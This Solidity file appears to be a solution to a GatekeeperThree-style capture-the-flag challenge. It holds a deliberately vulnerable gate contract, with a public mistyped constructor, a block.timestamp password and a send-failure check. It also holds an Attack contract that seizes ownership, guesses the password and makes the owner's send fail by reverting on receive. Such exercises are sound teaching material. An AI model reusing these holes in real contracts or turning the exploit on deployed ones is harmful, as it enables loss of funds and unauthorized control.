// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp; 
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        console.log("passed one");
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        console.log("passed two");
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            console.log("passed three");
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}

contract Attack {
    GatekeeperThree gkt;

    constructor(address payable  _addr) payable  {
        gkt = GatekeeperThree(_addr);
    }

    function pwn() external {
        gkt.construct0r();

        gkt.createTrick();
        gkt.getAllowance(block.timestamp);

        console.log(payable(gkt).balance);
        
        (bool success, ) = payable(gkt).call{value: 0.0011 ether}("");
        require(success, "Transfer failed");
    }

    function check() external {
        try gkt.enter() {
            console.log("success");
        } catch {
            console.log('fail');
        }
    }

    receive() external payable {
        revert();
    }
}